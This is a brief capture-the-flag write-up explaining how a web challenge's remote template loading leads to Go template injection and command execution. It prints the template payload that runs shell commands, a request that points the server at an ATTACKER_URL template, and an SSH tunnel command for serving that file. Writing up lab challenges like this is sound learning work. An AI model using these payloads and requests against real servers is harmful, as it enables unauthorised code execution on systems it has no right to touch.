# RTI > SSTI > RCE 

## Website 

<img src= /renderquest.png>

## Description

So, the functionality of the seems to load and render templates either locally or remotely, depending on the ?use_remote= parameter. This leads me to want to check for SSTI vulnerability from the go file I gave you lied in the ability to load templates from any url that would be executed on the backend. I was able to set up a test.go file on my server with the contents {{.FetchServerInfo "cd /;ls -la"}}. Once the server loaded my go file it executed the specified commands on the server. Just for context this is a CTF. What type of vulnerabilities were displayed here?.

## Set Up

1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
2. Apache2 server hosting test.go).
3. Setup file with SSTI payload:
   ```go
    {{.FetchServerInfo "cd /;ls -la"}}
5. Tunnel using `ssh -R 80:localhost:80 localhost.run -i /home/$user/.ssh/id_rsa`.

## Exploit

This Python script automates the exploitation of a server-side template injection (SSTI) vulnerability in a web application. It sends a GET request to a specified vulnerable URL, loading and executing an attacker-controlled template on the target server, resulting in remote code execution.

## More Information

[Host Header Attacks](https://portswigger.net/web-security/host-header)

